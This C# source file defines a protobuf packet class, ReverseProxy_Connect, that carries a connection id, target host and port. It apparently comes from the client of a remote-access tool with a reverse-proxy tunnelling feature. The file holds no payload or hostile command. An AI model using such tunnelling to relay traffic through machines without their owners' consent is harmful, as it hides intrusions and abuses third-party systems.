using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxy_Connect : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        [ProtoMember(2)]
        public string Target { get; set; }

        [ProtoMember(3)]
        public int Port { get; set; }

        public ReverseProxy_Connect()
        {

        }

        public ReverseProxy_Connect(int ConnectionId, string Target, int Port)
        {
            this.ConnectionId = ConnectionId;
            this.Target = Target;
            this.Port = Port;
        }

        public void Execute(Client client)
        {
            client.Send<ReverseProxy_Connect>(this);
        }
    }
}
